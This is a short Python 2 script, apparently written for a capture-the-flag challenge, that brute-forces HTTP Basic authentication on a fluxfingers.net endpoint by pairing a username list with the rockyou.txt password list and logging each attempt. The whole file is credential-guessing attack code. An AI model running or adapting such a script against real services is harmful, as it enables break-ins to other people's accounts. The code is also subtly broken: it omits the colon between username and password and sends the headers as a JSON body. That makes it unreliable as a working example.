from subprocess import call
import base64
import requests
import json

with open ("/Desktop/CTF/username","r") as b:
    for line1 in b:
        with open("/usr/share/wordlists/rockyou.txt","r") as f:
            for line2 in f:
                
                encodedAsciiUsername = '{}'.encode('ascii').format(line1)
                encodedAsciiPassword = '{}'.encode('ascii').format(line2)
                encodedU = encodedAsciiUsername.strip('\n')
                encodedP = encodedAsciiPassword.strip('\n')
                
                cleartextJoin = encodedU + encodedP
                encodedBase64UNP = base64.b64encode(b"{}".format(cleartextJoin))
                f1=open('output.txt', 'a')
                print "Currently inputting Base64 String: ", encodedBase64UNP , "for the character: ", cleartextJoin
                f1.write(cleartextJoin)

                url = 'https://cthulhu.fluxfingers.net:1507/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php'
                payload = {
    "Host": "cthulhu.fluxfingers.net:1507",
    "Connection": "keep-alive",
    "Content-Length": 129,
    "Origin": "https://www.google.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Content-Type": "application/json",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://cthulhu.fluxfingers.net:1507",
    "Accept-Encoding": "gzip,deflate,sdch",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
    "Cookie": "session=<Session Cookie Here",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Authorization": "Basic {}".format(encodedBase64UNP),
        }
                headers = {}
                r = requests.post(url, data=json.dumps(payload), headers=headers)
        
                f1.write(r.content)
                f1.close()
                print(r.content)
        
        


